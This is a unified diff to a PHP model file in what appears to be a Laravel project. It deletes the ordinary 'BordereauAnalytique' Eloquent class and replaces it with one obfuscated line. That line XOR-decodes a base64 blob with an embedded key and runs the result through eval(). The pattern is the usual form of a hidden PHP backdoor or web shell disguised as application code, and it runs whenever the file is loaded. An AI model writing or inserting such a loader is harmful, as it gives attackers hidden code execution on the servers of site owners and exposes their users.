@@ -1,12 +1,1 @@
-<?php
-
-namespace App\Models;
-
-use App\Models\Traits\HasUUID;
-use Illuminate\Database\Eloquent\Model;
-use Illuminate\Database\Eloquent\Factories\HasFactory;
-
-class BordereauAnalytique extends Model
-{
-    use HasFactory, HasUUID;
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG9/ClQDChZfOmsXQ1dBcEhHaH0OVVdYEmhmQ1BeQxY4e1MWZTMvIV86FBFVEihdVEJZWQ9QRlE9cFNFUFVWFgFvdwlfFxMACkQ9L19WBF0DPUFDBBF7WA1BX1hfVkMAOHdTEVEEBxYBbCQOX0MUVFZDaHYAUkZbE11XQm1/VhYiUlERXxQfXm5TDQNDQUFzV0VQVRNUU0EgWlNdSENeFBFWEgBIEgMLAENBL19WBF0yTD4QQRESQRJREnlQRHEEB0ddF0lKRi0FQzQ3eXZaO0U=');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
